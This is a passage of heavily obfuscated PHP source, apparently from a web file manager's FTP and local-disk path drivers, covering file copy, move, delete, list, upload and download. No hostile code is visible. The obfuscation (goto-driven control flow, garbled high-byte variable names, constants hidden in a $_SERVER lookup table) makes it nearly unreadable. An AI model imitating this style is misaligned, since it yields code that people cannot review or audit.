return $this->getPathOuter($e‡è§¢­¢“); } if (!$this->mkdir($this->pathFather($e‡è§¢­¢“))) { return !1; } if ($e‡è§¢­¢“ = @ftp_mkdir($this->connect, $e‡è§¢­¢“)) { return $this->getPathOuter($e‡è§¢­¢“); } return !1; } public function copyFile($C°«—î‘Ì‘, $a‰ğ¼å¸˜) { goto EÃŒÔ×Òš; Bì‚‘¨˜÷: $this->tempFileRemve($dÎËºïíÓ); return $dø‹î¬÷ºË; goto DÀØ’š”Ôë; EÃŒÔ×Òš: if (!$this->_isconn()) { return !1; } $CÉ„ÂÊÀ¶È = $this->pathThis($this->iconvSystem($C°«—î‘Ì‘)); $dÎËºïíÓ = $this->tempFile($CÉ„ÂÊÀ¶È); goto aÇí‡ëŠ; aÇí‡ëŠ: $C³»¦óøƒÅ = $this->iconvApp($dÎËºïíÓ); $this->download($C°«—î‘Ì‘, $C³»¦óøƒÅ); $dø‹î¬÷ºË = $this->upload($a‰ğ¼å¸˜, $C³»¦óøƒÅ); goto Bì‚‘¨˜÷; DÀØ’š”Ôë: } public function moveFile($a«ôÈóÅ, $eŞáòŸ¶Üš) { if (!$this->_isconn()) { return !1; } $a«ôÈóÅ = $this->iconvSystem($a«ôÈóÅ); $eŞáòŸ¶Üš = $this->iconvSystem($eŞáòŸ¶Üš); $A¼“ÈáÙ‚ = @ftp_rename($this->connect, $a«ôÈóÅ, $eŞáòŸ¶Üš); return $A¼“ÈáÙ‚ ? $this->getPathOuter($eŞáòŸ¶Üš) : !1; } public function delFile($b“™©¢ÛÕ) { if (!$this->_isconn()) { return !1; } $b“™©¢ÛÕ = $this->iconvSystem($b“™©¢ÛÕ); return @ftp_delete($this->connect, $b“™©¢ÛÕ); } public function delFolder($cºÀñä¥œñ) { goto d´¶ô—åª; fÒ°ĞÇÁò‘: foreach ($BÆÆµ‘Ì as $Aœñ”ñ¾ä) { $Aœñ”ñ¾ä = $this->iconvSystem($Aœñ”ñ¾ä); $AÕ¥âŒíÍİ = @ftp_rmdir($this->connect, $Aœñ”ñ¾ä); if (!$AÕ¥âŒíÍİ) { return !1; } } $cºÀñä¥œñ = $this->iconvSystem($cºÀñä¥œñ); return @ftp_rmdir($this->connect, $cºÀñä¥œñ); goto fµîÙœõ÷©; FòÜèîËîã: $this->fileList($cºÀñä¥œñ, $BÆÆµ‘Ì, $AÇñÄŞ÷—Ö, !0); $this->listItemCache = !0; foreach ($AÇñÄŞ÷—Ö as $A¨İÎ¼ï‡¿) { $Aœñ”ñ¾ä = $this->iconvSystem($A¨İÎ¼ï‡¿[$_SERVER[ÈİÅ¿ÈÈ¥×][28]]); $AÕ¥âŒíÍİ = @ftp_delete($this->connect, $Aœñ”ñ¾ä); if (!$AÕ¥âŒíÍİ) { return !1; } } goto fÒ°ĞÇÁò‘; d´¶ô—åª: if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $BÆÆµ‘Ì = $AÇñÄŞ÷—Ö = array(); goto FòÜèîËîã; fµîÙœõ÷©: } public function rename($fŸ´ÚÛò, $F‘Öøàî•¨) { goto C­Ã¿…«¿Í; C­Ã¿…«¿Í: $eäÒÒ©–³ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$this->_isconn()) { return !1; } $EïÜĞ‚«¶´ = $this->fileNameAuto($this->pathFather($fŸ´ÚÛò), $F‘Öøàî•¨); goto D¯‘¾“Õã®; B÷ÉÊñŒÎØ: return $A¾íôÒá– ? $this->getPathOuter($cêƒ‚Â¹Èî) : !1; goto AÀ½½Å¾¶É; dÊ¢†íĞÀä: $cêƒ‚Â¹Èî = rtrim($FÚ¹µ°õˆç, $eäÒÒ©–³[8]) . $eäÒÒ©–³[8] . $EïÜĞ‚«¶´; $A¾íôÒá– = @ftp_rename($this->connect, $fŸ´ÚÛò, $cêƒ‚Â¹Èî); $cêƒ‚Â¹Èî = $this->iconvApp($cêƒ‚Â¹Èî); goto B÷ÉÊñŒÎØ; D¯‘¾“Õã®: $EïÜĞ‚«¶´ = $this->iconvSystem($EïÜĞ‚«¶´); $fŸ´ÚÛò = $this->iconvSystem($fŸ´ÚÛò); $FÚ¹µ°õˆç = $this->pathFather($fŸ´ÚÛò); goto dÊ¢†íĞÀä; AÀ½½Å¾¶É: } private function folderInfo($EÜãœš­Š±, $C¯ã“‘ = false) { $Dùˆ…›ãĞ´ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $c¦•­Ÿ˜‚ƒ = array($Dùˆ…›ãĞ´[28] => $this->pathThis($EÜãœš­Š±), $Dùˆ…›ãĞ´[75] => $this->getPathOuter($Dùˆ…›ãĞ´[8] . $EÜãœš­Š±), $Dùˆ…›ãĞ´[29] => $Dùˆ…›ãĞ´[76]); if ($C¯ã“‘) { return $c¦•­Ÿ˜‚ƒ; } $c¦•­Ÿ˜‚ƒ[$Dùˆ…›ãĞ´[190]] = $c¦•­Ÿ˜‚ƒ[$Dùˆ…›ãĞ´[107]] = 0; $c¦•­Ÿ˜‚ƒ[$Dùˆ…›ãĞ´[191]] = $c¦•­Ÿ˜‚ƒ[$Dùˆ…›ãĞ´[192]] = !0; return $c¦•­Ÿ˜‚ƒ; } private function fileInfo($dÕÍÑÃÌ›Õ, $b«Ø‡âÏ¾ = false, $aÉÖ±­ğØ‹ = array()) { goto c´³õ¤¦À; f¡Î‘İßÒ: $AŸâé¦±Î[$F£æ¾¥•³â[107]] = @ftp_mdtm($this->connect, $eªë‹÷“èø); if (empty($aÉÖ±­ğØ‹)) { $aÉÖ±­ğØ‹ = $this->objectMeta($dÕÍÑÃÌ›Õ); if (!$aÉÖ±­ğØ‹) { return $AŸâé¦±Î; } } $AŸâé¦±Î[$F£æ¾¥•³â[77]] = $aÉÖ±­ğØ‹[$F£æ¾¥•³â[77]]; goto a©‚¬Ç“ğ‹; a©‚¬Ç“ğ‹: return $AŸâé¦±Î; goto Eƒ©ªİÉŞå; c´³õ¤¦À: $F£æ¾¥•³â =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $AŸâé¦±Î = array($F£æ¾¥•³â[28] => $this->pathThis($dÕÍÑÃÌ›Õ), $F£æ¾¥•³â[75] => $this->getPathOuter($F£æ¾¥•³â[8] . $dÕÍÑÃÌ›Õ), $F£æ¾¥•³â[29] => $F£æ¾¥•³â[171], $F£æ¾¥•³â[77] => isset($aÉÖ±­ğØ‹[$F£æ¾¥•³â[77]]) ? $aÉÖ±­ğØ‹[$F£æ¾¥•³â[77]] : 0, $F£æ¾¥•³â[165] => $this->ext($dÕÍÑÃÌ›Õ)); if ($b«Ø‡âÏ¾) { return $AŸâé¦±Î; } goto FœÅßğº§¼; FœÅßğº§¼: $AŸâé¦±Î[$F£æ¾¥•³â[190]] = $AŸâé¦±Î[$F£æ¾¥•³â[107]] = 0; $AŸâé¦±Î[$F£æ¾¥•³â[191]] = $AŸâé¦±Î[$F£æ¾¥•³â[192]] = !0; $eªë‹÷“èø = $this->iconvSystem($dÕÍÑÃÌ›Õ); goto f¡Î‘İßÒ; Eƒ©ªİÉŞå: } public function size($BÜÍˆ‡ŒĞå) { $e¨Ñ“‘‹’ƒ = $this->objectMeta($BÜÍˆ‡ŒĞå); return $e¨Ñ“‘‹’ƒ ? $e¨Ñ“‘‹’ƒ[$_SERVER[ÈİÅ¿ÈÈ¥×][77]] : 0; } public function info($E¥ÂæÑ™Š) { if ($this->isFile($E¥ÂæÑ™Š)) { return $this->fileInfo($E¥ÂæÑ™Š, 0); } else { if ($this->isFolder($E¥ÂæÑ™Š)) { return $this->folderInfo($E¥ÂæÑ™Š); } } return !1; } private function fileList($cÜÒ¯ŠÕ, &$C¼Øˆ®©äƒ, &$E³ëˆ×Ô“, $f˜Ä›’ö·ì = false) { goto a¤«°ïƒ¶; däÃ®Ïªßø: $b‡ö§‚µ†ò = $this->listItemCache === !1 ? !1 : !0; $e›„Åò«–• = @ftp_rawlist($this->connect, $cÜÒ¯ŠÕ); if (!$e›„Åò«–•) { $e›„Åò«–• = array(); } goto E›¥²ˆÛ½’; a¤«°ïƒ¶: $D¤Á„•Š =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $cÜÒ¯ŠÕ = $this->iconvSystem($cÜÒ¯ŠÕ); if (!$this->isFolder($cÜÒ¯ŠÕ)) { return !1; } goto d‹çÛ“ÃøÎ; d‹çÛ“ÃøÎ: @ftp_chdir($this->connect, $D¤Á„•Š[8]); $cÜÒ¯ŠÕ = rtrim($cÜÒ¯ŠÕ, $D¤Á„•Š[8]) . $D¤Á„•Š[8]; check_abort(); goto däÃ®Ïªßø; E›¥²ˆÛ½’: $F•ã“Úİš = array($D¤Á„•Š[91] => 1, $D¤Á„•Š[1212] => 1); foreach ($e›„Åò«–• as $C…çÊµ³¦) { goto aŒâŸßçï”; Cèƒ÷•—Óó: if (substr($C…çÊµ³¦, 0, 1) == $D¤Á„•Š[1213]) { $dœ‹µÇÙä«[$D¤Á„•Š[29]] = $D¤Á„•Š[76]; $dœ‹µÇÙä«[$D¤Á„•Š[77]] = 0; } $d›­ò³‘¤ = $dœ‹µÇÙä«[$D¤Á„•Š[29]] == $D¤Á„•Š[76] ? !0 : !1; if ($b‡ö§‚µ†ò) { $this->cacheMethod($D¤Á„•Š[195], $eæ‹Èª˜“›, $d›­ò³‘¤); $this->cacheMethod($D¤Á„•Š[196], $eæ‹Èª˜“›, $dœ‹µÇÙä«); } goto AŒ­½Ë¥; CËª¨ç´§å: if (!$eæ‹Èª˜“› || isset($F•ã“Úİš[$eæ‹Èª˜“›])) { continue; } $eæ‹Èª˜“› = $this->iconvApp($cÜÒ¯ŠÕ . ltrim($eæ‹Èª˜“›, $D¤Á„•Š[8])); $dœ‹µÇÙä« = array($D¤Á„•Š[28] => $eæ‹Èª˜“›, $D¤Á„•Š[29] => $D¤Á„•Š[171], $D¤Á„•Š[77] => $dœÚ«œã„¡[4]); goto Cèƒ÷•—Óó; aŒâŸßçï”: $dœÚ«œã„¡ = $this->_listItem($C…çÊµ³¦); if ($dœÚ«œã„¡[0] == $D¤Á„•Š[703]) { continue; } $eæ‹Èª˜“› = $dœÚ«œã„¡[8]; goto CËª¨ç´§å; AŒ­½Ë¥: if ($d›­ò³‘¤) { $C¼Øˆ®©äƒ[] = $eæ‹Èª˜“›; if ($f˜Ä›’ö·ì) { $this->fileList($eæ‹Èª˜“›, $C¼Øˆ®©äƒ, $E³ëˆ×Ô“, $f˜Ä›’ö·ì); } continue; } $E³ëˆ×Ô“[] = $dœ‹µÇÙä«; goto a¾îÛ¡Ÿ; a¾îÛ¡Ÿ: } if ($b‡ö§‚µ†ò) { $this->cacheMethod($D¤Á„•Š[195], $cÜÒ¯ŠÕ, !0); } goto c¶­õ»Ó²Ô; c¶­õ»Ó²Ô: } private function _listItem($d¹Øíáîîó) { if (empty($d¹Øíáîîó)) { return array(); } $CóìÙ…ê‚£ = preg_split($_SERVER[ÈİÅ¿ÈÈ¥×][1214], $d¹Øíáîîó); if (count($CóìÙ…ê‚£) <= 9) { return $CóìÙ…ê‚£; } $CóìÙ…ê‚£[8] = trim(substr($d¹Øíáîîó, strpos($d¹Øíáîîó, $CóìÙ…ê‚£[7]) + strlen($CóìÙ…ê‚£[7]))); return array_splice($CóìÙ…ê‚£, 0, 9); } public function listPath($FĞÕ”ì¯Ì, $DÓä™ù¢ô = false) { goto Dã¡°ƒ’™¾; Dã¡°ƒ’™¾: $fèËÑùÃÛ´ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$this->_isconn()) { return !1; } $DˆîãŠªâ‚ = $EõÇõß”Ø£ = array(); goto c‡Àèîïù“; c‡Àèîïù“: $this->fileList($FĞÕ”ì¯Ì, $DˆîãŠªâ‚, $EõÇõß”Ø£); foreach ($DˆîãŠªâ‚ as $Aµ×‹¸ƒò¤ => $E¾ªÖ²ïÆ„) { $DˆîãŠªâ‚[$Aµ×‹¸ƒò¤] = $this->folderInfo($E¾ªÖ²ïÆ„, $DÓä™ù¢ô); } foreach ($EõÇõß”Ø£ as $Aµ×‹¸ƒò¤ => $E¾ªÖ²ïÆ„) { $EõÇõß”Ø£[$Aµ×‹¸ƒò¤] = $this->fileInfo($E¾ªÖ²ïÆ„[$fèËÑùÃÛ´[28]], $DÓä™ù¢ô, $E¾ªÖ²ïÆ„); } goto CİŠ‚»ƒÇÆ; CİŠ‚»ƒÇÆ: return array($fèËÑùÃÛ´[74] => $DˆîãŠªâ‚, $fèËÑùÃÛ´[73] => $EõÇõß”Ø£); goto E¦Ï¾àÒËæ; E¦Ï¾àÒËæ: } public function has($FñÛâ ´¨ˆ, $eĞºÚ¹»Ô‹ = false, $d·ëï…¸ôÚ = true) { goto Côàæíè; Côàæíè: $DŸÙˆÊ›Å =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $DÚîìÕöÁ = $FÔÎÑªá‹ = array(); $f­ÂÜŠ»Ëƒ = $eĞºÚ¹»Ô‹ ? !0 : !1; goto cÕ´íƒ»ñƒ; eÀ ™éÉÅ«: return !1; goto dÄÕĞ‚Œœ; cÕ´íƒ»ñƒ: $this->fileList($FñÛâ ´¨ˆ, $DÚîìÕöÁ, $FÔÎÑªá‹, $f­ÂÜŠ»Ëƒ); if ($eĞºÚ¹»Ô‹) { return array($DŸÙˆÊ›Å[199] => count($FÔÎÑªá‹), $DŸÙˆÊ›Å[200] => count($DÚîìÕöÁ)); } if ($d·ëï…¸ôÚ) { if (count($FÔÎÑªá‹)) { return !0; } } else { if (count($DÚîìÕöÁ)) { return !0; } } goto eÀ ™éÉÅ«; dÄÕĞ‚Œœ: } public function listAll($aí¶¹½ç‘) { goto BÍ°°ó“ïğ; d¦±âÕ¿ƒò: $this->fileList($aí¶¹½ç‘, $e«ÄÑë‹õí, $FÄŞ´é½¿, !0); $FêšÈÔ¹Ï¬ = array(); foreach ($FÄŞ´é½¿ as $E†»°¡ê) { $FêšÈÔ¹Ï¬[$E†»°¡ê[$CèøÇ÷Ÿ[28]]] = $E†»°¡ê[$CèøÇ÷Ÿ[77]]; } goto EèŞ–Ğ×š; EèŞ–Ğ×š: foreach ($e«ÄÑë‹õí as $E†»°¡ê) { if (is_string($E†»°¡ê)) { $FêšÈÔ¹Ï¬[$E†»°¡ê] = 0; } } return $this->listAllFiles($aí¶¹½ç‘, array_keys($FêšÈÔ¹Ï¬), $FêšÈÔ¹Ï¬); goto e£¸Ü†»¾; BÍ°°ó“ïğ: $CèøÇ÷Ÿ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$this->_isconn()) { return !1; } $e«ÄÑë‹õí = $FÄŞ´é½¿ = array(); goto d¦±âÕ¿ƒò; e£¸Ü†»¾: } public function getContent($C§ÓˆÊÜáö) { if (!$this->_isconn()) { return !1; } $C§ÓˆÊÜáö = $this->iconvSystem($C§ÓˆÊÜáö); return $this->fileSubstr($C§ÓˆÊÜáö); } public function setContent($fƒ–ƒÛ‘İ‘, $d’–Ÿ¸…šğ = '') { goto Eô‘À²Ãà; fÕ•µÇ•: file_put_contents($cÑğ­ƒ¥ùå, $d’–Ÿ¸…šğ); $aêâÔÒÉØ = $this->upload($fƒ–ƒÛ‘İ‘, $this->iconvApp($cÑğ­ƒ¥ùå)); $this->tempFileRemve($cÑğ­ƒ¥ùå); goto B·…ùà«©; B·…ùà«©: return $aêâÔÒÉØ; goto a×†êÖÎ ¦; Eô‘À²Ãà: if (!$this->_isconn()) { return !1; } $fØñÙŠç = $this->pathThis($this->iconvSystem($fƒ–ƒÛ‘İ‘)); $cÑğ­ƒ¥ùå = $this->tempFile($fØñÙŠç); goto fÕ•µÇ•; a×†êÖÎ ¦: } public function fileSubstr($d¾•½º¶¸, $b‰æëÚ“˜“ = 0, $C‰º…Õ—ô½ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($d¾•½º¶¸, $b‰æëÚ“˜“, $C‰º…Õ—ô½); } private function ftpRequest($C½ˆÇÙ¹»á, $a„Á¿ºŠš‚ = 0, $Eô‹§Öõ» = false) { goto fÜ¾·ô¬ğ; C§Ì³¾òÕ: curl_setopt($F˜¥ğÃ»Îá, CURLOPT_URL, $DöÅ¸õŞé . $this->pathEncode($C½ˆÇÙ¹»á)); curl_setopt($F˜¥ğÃ»Îá, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($Eô‹§Öõ») { $bïÀßÜĞÍõ = $a„Á¿ºŠš‚ + $Eô‹§Öõ» - 1; curl_setopt($F˜¥ğÃ»Îá, CURLOPT_RANGE, "{$a„Á¿ºŠš‚}\55{$bïÀßÜĞÍõ}"); } goto f«¤ï×î®¬; fÜ¾·ô¬ğ: $C½ˆÇÙ¹»á = $this->iconvSystem($C½ˆÇÙ¹»á); $DöÅ¸õŞé = $this->scheme . $this->host . $_SERVER[ÈİÅ¿ÈÈ¥×][4] . $this->port; $F˜¥ğÃ»Îá = curl_init(); goto C§Ì³¾òÕ; C ÀÙ¢ê«î: return $B¶ÛÃÄ¢¸; goto Dîïæ¡‰Šƒ; f«¤ï×î®¬: curl_setopt($F˜¥ğÃ»Îá, CURLOPT_RETURNTRANSFER, 1); $B¶ÛÃÄ¢¸ = curl_exec($F˜¥ğÃ»Îá); curl_close($F˜¥ğÃ»Îá); goto C ÀÙ¢ê«î; Dîïæ¡‰Šƒ: } public function upload($Föƒ†Œ”ø«, $fÌëˆ éÄ§, $A½ÙÅó«‡ô = false, $F‚Áõ™¾¼å = REPEAT_REPLACE) { goto Fé‡Ô…Ø›ê; Fé‡Ô…Ø›ê: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($Föƒ†Œ”ø«))) { return !1; } $Föƒ†Œ”ø« = $this->iconvSystem($Föƒ†Œ”ø«); goto eÅ¦Œº½©£; eÅ¦Œº½©£: $fÌëˆ éÄ§ = $this->iconvSystem($fÌëˆ éÄ§); $cÕ¯Ë¦¯‰÷ = ftp_nb_put($this->connect, $Föƒ†Œ”ø«, $fÌëˆ éÄ§, FTP_BINARY); while ($cÕ¯Ë¦¯‰÷ == FTP_MOREDATA) { $cÕ¯Ë¦¯‰÷ = ftp_nb_continue($this->connect); } goto eª£¾ˆ¨µ; eª£¾ˆ¨µ: if ($cÕ¯Ë¦¯‰÷ != FTP_FINISHED) { return !1; } return $this->getPathOuter($Föƒ†Œ”ø«); goto cÖìˆÜÇ¨Ï; cÖìˆÜÇ¨Ï: } public function download($FÑÀ®‚¨‹¿, $FÚÎÔ…åƒÀ = '') { goto aÇæËÃŠÈœ; Fˆ´Õ÷›Å•: $FÑÀ®‚¨‹¿ = $this->iconvSystem($FÑÀ®‚¨‹¿); $FÚÎÔ…åƒÀ = $this->iconvSystem($FÚÎÔ…åƒÀ); $bÑî™íÅ¾ = ftp_nb_get($this->connect, $FÚÎÔ…åƒÀ, $FÑÀ®‚¨‹¿, FTP_BINARY); goto F¦Ä²„î…; aÇæËÃŠÈœ: if (!$this->_isconn()) { return !1; } $Dä»©ºÌ‰ = $this->pathFather($FÚÎÔ…åƒÀ); if (!IO::mkdir($Dä»©ºÌ‰)) { return !1; } goto Fˆ´Õ÷›Å•; F¦Ä²„î…: while ($bÑî™íÅ¾ == FTP_MOREDATA) { $bÑî™íÅ¾ = ftp_nb_continue($this->connect); } if ($bÑî™íÅ¾ != FTP_FINISHED) { return !1; } return $this->iconvApp($FÚÎÔ…åƒÀ); goto CÉ½ÁˆÇª²; CÉ½ÁˆÇª²: } public function exist($d·ˆÚÓ…¿) { return $this->isFile($d·ˆÚÓ…¿) || $this->isFolder($d·ˆÚÓ…¿); } public function isFile($bƒÈÕå†‘) { return !$this->isFolder($bƒÈÕå†‘) && $this->objectMeta($bƒÈÕå†‘); } public function isFolder($D•æ³ğˆÊƒ) { return $this->cacheMethod($_SERVER[ÈİÅ¿ÈÈ¥×][195], $D•æ³ğˆÊƒ); } protected function objectMeta($C‘™¥¡À´í) { return $this->cacheMethod($_SERVER[ÈİÅ¿ÈÈ¥×][196], $C‘™¥¡À´í); } protected function _objectMeta($bŒáí Èà–) { goto aœº…’Š‘¯; f›Î³â¹”î: $bŒáí Èà– = $this->iconvSystem($bŒáí Èà–); $B¼ÜœŞøğÀ = array($dÇ©ãÛ¥ù´[28] => $this->iconvApp($bŒáí Èà–), $dÇ©ãÛ¥ù´[29] => $dÇ©ãÛ¥ù´[171], $dÇ©ãÛ¥ù´[77] => 0); @ftp_chdir($this->connect, $dÇ©ãÛ¥ù´[8]); goto EÎÓ™‰ñ•Œ; aœº…’Š‘¯: $dÇ©ãÛ¥ù´ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if ($bŒáí Èà– == $dÇ©ãÛ¥ù´[33] || $bŒáí Èà– == $dÇ©ãÛ¥ù´[8]) { return array(); } if (!$this->_isconn()) { return !1; } goto f›Î³â¹”î; EÎÓ™‰ñ•Œ: $aÕ¥“¾¯Äå = @ftp_size($this->connect, $bŒáí Èà–); if ($aÕ¥“¾¯Äå != -1) { $B¼ÜœŞøğÀ[$dÇ©ãÛ¥ù´[77]] = $aÕ¥“¾¯Äå; } else { $Aõ–ÀÂÜÙæ = @ftp_chdir($this->connect, $bŒáí Èà–); if (!$Aõ–ÀÂÜÙæ) { return !1; } $B¼ÜœŞøğÀ[$dÇ©ãÛ¥ù´[29]] = $dÇ©ãÛ¥ù´[76]; } return $B¼ÜœŞøğÀ; goto dùƒ–³‰ÈÓ; dùƒ–³‰ÈÓ: } protected function _isFolder($A‘¡’ƒ¡) { $eÒÛ›ÂÕ­‰ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if ($A‘¡’ƒ¡ == $eÒÛ›ÂÕ­‰[33] || $A‘¡’ƒ¡ == $eÒÛ›ÂÕ­‰[8]) { return !0; } $Fö¬”Õ„®‡ = $this->_objectMeta($A‘¡’ƒ¡); return isset($Fö¬”Õ„®‡[$eÒÛ›ÂÕ­‰[29]]) && $Fö¬”Õ„®‡[$eÒÛ›ÂÕ­‰[29]] == $eÒÛ›ÂÕ­‰[76] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($DÓçÓ±ù‰) { if (substr($DÓçÓ±ù‰, 0, 2) == $_SERVER[ÈİÅ¿ÈÈ¥×][1205]) { $DÓçÓ±ù‰ = BASIC_PATH . substr($DÓçÓ±ù‰, 2); } return $DÓçÓ±ù‰; } public function iconvApp($a†£ïÙçß‰) { $b¨îÖù®ô =& $_SERVER[ÈİÅ¿ÈÈ¥×]; global $config; return $this->iconvTo($a†£ïÙçß‰, $config[$b¨îÖù®ô[1203]], $config[$b¨îÖù®ô[1202]]); } public function iconvSystem($E³ğ¯Ğºõ) { $c”ØŠ‚©ë =& $_SERVER[ÈİÅ¿ÈÈ¥×]; global $config; return $this->iconvTo($E³ğ¯Ğºõ, $config[$c”ØŠ‚©ë[1202]], $config[$c”ØŠ‚©ë[1203]]); } public function getPathOuter($dÍ†…Ç™Š) { goto CÒ¼­¶°øˆ; D´›ĞÙ×°ã: return $this->pathDriver . $cŞÇˆªÓ÷ï[8] . ltrim($dÍ†…Ç™Š, $cŞÇˆªÓ÷ï[8]); goto béã¿ï‹ˆš; cäÌò±ÏÉ·: if (substr($b˜Ò…»»¬Ú, 0, 2) == $cŞÇˆªÓ÷ï[1205]) { $b˜Ò…»»¬Ú = BASIC_PATH . substr($b˜Ò…»»¬Ú, 2); } if (substr($dÍ†…Ç™Š, 0, 2) == $cŞÇˆªÓ÷ï[1205]) { $dÍ†…Ç™Š = BASIC_PATH . substr($dÍ†…Ç™Š, 2); } $b˜Ò…»»¬Ú = KodIO::clear($b˜Ò…»»¬Ú); goto cÄƒ°¥ß±Æ; CÒ¼­¶°øˆ: $cŞÇˆªÓ÷ï =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $b˜Ò…»»¬Ú = $this->iconvApp($this->pathBase); $dÍ†…Ç™Š = $this->iconvApp($dÍ†…Ç™Š); goto cäÌò±ÏÉ·; cÄƒ°¥ß±Æ: $dÍ†…Ç™Š = KodIO::clear($dÍ†…Ç™Š); $dÍ†…Ç™Š = substr($dÍ†…Ç™Š, strlen($b˜Ò…»»¬Ú)); if (empty($this->pathDriver)) { return $dÍ†…Ç™Š; } goto D´›ĞÙ×°ã; béã¿ï‹ˆš: } public function mkfile($B›¾²‚ãù±, $BÛæ¢¬Ë = '', $CÌÔ»ø“±” = REPEAT_RENAME) { $B›¾²‚ãù± = $this->iconvSystem($B›¾²‚ãù±); @touch($B›¾²‚ãù±); if ($BÛæ¢¬Ë) { file_put_contents($B›¾²‚ãù±, $BÛæ¢¬Ë); } return is_file($B›¾²‚ãù±) ? $this->getPathOuter($B›¾²‚ãù±) : !1; } public function mkdir($f¨’¼çï‚, $aå¥Œ¶­È = REPEAT_SKIP) { $f¨’¼çï‚ = $this->iconvSystem($f¨’¼çï‚); if (is_dir($f¨’¼çï‚)) { return $this->getPathOuter($f¨’¼çï‚); } @mkdir($f¨’¼çï‚, 511, !0); return is_dir($f¨’¼çï‚) ? $this->getPathOuter($f¨’¼çï‚) : !1; } public function copyFile($Dó™»öçˆ¥, $CŸäªë‹¬®) { $this->mkdir($this->pathFather($CŸäªë‹¬®)); $Dó™»öçˆ¥ = $this->iconvSystem($Dó™»öçˆ¥); $CŸäªë‹¬® = $this->iconvSystem($CŸäªë‹¬®); $Cáë¡›ŠÁ = copy_64($Dó™»öçˆ¥, $CŸäªë‹¬®); return $Cáë¡›ŠÁ ? $this->getPathOuter($CŸäªë‹¬®) : !1; } public function moveFile($DšÏ”ã‚Ğ, $E¶—„Ã©) { $this->mkdir($this->pathFather($E¶—„Ã©)); $DšÏ”ã‚Ğ = $this->iconvSystem($DšÏ”ã‚Ğ); $E¶—„Ã© = $this->iconvSystem($E¶—„Ã©); $EÅÚëàŠ” = intval(@rename($DšÏ”ã‚Ğ, $E¶—„Ã©)); if (!$EÅÚëàŠ”) { if ($EÅÚëàŠ” = intval(@copy_64($DšÏ”ã‚Ğ, $E¶—„Ã©))) { @unlink($DšÏ”ã‚Ğ); } } return $EÅÚëàŠ” ? $this->getPathOuter($E¶—„Ã©) : !1; } public function delFile($F·ãÔÌÃßŒ) { $F·ãÔÌÃßŒ = $this->iconvSystem($F·ãÔÌÃßŒ); if (!@unlink($F·ãÔÌÃßŒ)) { @chmod($F·ãÔÌÃßŒ, 511); if (!@unlink($F·ãÔÌÃßŒ)) { return !1; } } else { return !0; } } public function delFolder($C±ŞêÈ·Š) { goto aæçš¬©Ÿ; Bœå¾ôêù§: return rmdir($C±ŞêÈ·Š); goto e×³Óµ±; a¢µÂ¶ìóÙ: if (!($d÷¿Èô¬©° = opendir($C±ŞêÈ·Š))) { return !1; } while (($C®¦ƒÜŒ¯ = readdir($d÷¿Èô¬©°)) !== !1) { if ($C®¦ƒÜŒ¯ == $bØÃá—È†¼[91] || $C®¦ƒÜŒ¯ == $bØÃá—È†¼[1212]) { continue; } $aò—”´ÉÀß = $C±ŞêÈ·Š . $bØÃá—È†¼[8] . $C®¦ƒÜŒ¯; if (is_file($aò—”´ÉÀß) || is_link($aò—”´ÉÀß)) { if (!unlink($aò—”´ÉÀß)) { chmod($aò—”´ÉÀß, 511); if (!unlink($aò—”´ÉÀß)) { return !1; } } } else { if (is_dir($aò—”´ÉÀß)) { chmod($aò—”´ÉÀß, 511); $aò—”´ÉÀß = $this->iconvApp($aò—”´ÉÀß); if (!$this->delFolder($aò—”´ÉÀß)) { return !1; } } } } closedir($d÷¿Èô¬©°); goto Bœå¾ôêù§; aæçš¬©Ÿ: $bØÃá—È†¼ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $C±ŞêÈ·Š = $this->iconvSystem($C±ŞêÈ·Š); if (!is_dir($C±ŞêÈ·Š)) { return !0; } goto a¢µÂ¶ìóÙ; e×³Óµ±: } public function rename($FÀ•¬×‡ê¥, $b¼òÙÉµåÑ) { goto B·°¶æí; f¢è¢Á¤Ã£: $d§É¡À¶’ = @rename($FÀ•¬×‡ê¥, $f¹ğ²‚¾); $f¹ğ²‚¾ = $this->iconvApp($f¹ğ²‚¾); return $d§É¡À¶’ ? $this->getPathOuter($f¹ğ²‚¾) : !1; goto BçğåÊò·; BÁÖ‘·µĞ„: $FÀ•¬×‡ê¥ = $this->iconvSystem($FÀ•¬×‡ê¥); $EåšÙ¡–‘ˆ = $this->pathFather($FÀ•¬×‡ê¥); $f¹ğ²‚¾ = rtrim($EåšÙ¡–‘ˆ, $bêÛæ“˜ö[8]) . $bêÛæ“˜ö[8] . $Fßßî®Ù °; goto f¢è¢Á¤Ã£; B·°¶æí: $bêÛæ“˜ö =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $Fßßî®Ù ° = $this->fileNameAuto($this->pathFather($FÀ•¬×‡ê¥), $b¼òÙÉµåÑ); $Fßßî®Ù ° = $this->iconvSystem($Fßßî®Ù °); goto BÁÖ‘·µĞ„; BçğåÊò·: } public function size($bí¯§ ÈäÌ) { $bí¯§ ÈäÌ = $this->iconvSystem($bí¯§ ÈäÌ); return filesize_64($bí¯§ ÈäÌ); } public function info($Aî ïÉì¼Ü) { $Aî ïÉì¼Ü = $this->iconvSystem($Aî ïÉì¼Ü); if ($this->isFolder($Aî ïÉì¼Ü)) { return $this->folderInfo($Aî ïÉì¼Ü); } else { if ($this->isFile($Aî ïÉì¼Ü)) { return $this->fileInfo($Aî ïÉì¼Ü); } } return !1; } protected function infoChildren($bŞğ‚ì¶…é, &$B†äÍìƒ‚¨, $cÎåÜ‡²Éà = true) { goto BöŠ ¨Ñ‹×; BöŠ ¨Ñ‹×: $BáÉ¬•×¯Á =& $_SERVER[ÈİÅ¿ÈÈ¥×]; check_abort_echo(); $bŞğ‚ì¶…é = rtrim($bŞğ‚ì¶…é, $BáÉ¬•×¯Á[8]) . 